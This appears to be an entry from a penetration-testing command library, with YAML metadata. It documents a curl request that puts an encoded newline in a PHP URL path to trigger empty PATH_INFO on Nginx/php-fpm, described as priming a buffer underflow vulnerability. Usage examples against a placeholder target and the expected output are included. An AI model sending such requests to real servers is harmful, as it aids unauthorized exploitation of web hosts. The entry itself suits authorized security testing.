---
data: 'curl "http://localhost/index.php/%0a" -v'
tags:
  - http
  - trigger
  - curl
type: command
executor: bash
platforms:
  - Linux
  - Web
id: a57550aa-1f8c-4f93-837b-6c1551a7d9be
created_at: '2025-12-14T17:23:49.459Z'
updated_at: '2025-12-14T17:23:49.459Z'
verified: false
validated: true
submitted: true
---
# curl-trigger-empty-pathinfo

## Command

```bash
curl "http://localhost/index.php/%0a" -v
```

## Description

Sends an HTTP GET request with an encoded newline in the path to trigger empty PATH_INFO in Nginx/php-fpm setups, priming the buffer underflow vulnerability.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `%0a` | Encoded newline in URL | Yes |
| `-v` | Verbose output | Yes |

## Examples

### Basic Usage

```bash
curl "http://target.com/script.php/%0a" -v
```

### Advanced Usage

```bash
curl -H "Host: vulnerable-site" "http://localhost/index.php/%0a" -v --max-time 10
```

## Expected Output

* Connected to localhost (127.0.0.1) port 80
> GET /index.php/%0a HTTP/1.1
< HTTP/1.1 200 OK
(Body with PHP response or error)

## Related

- [[Related Procedure]]
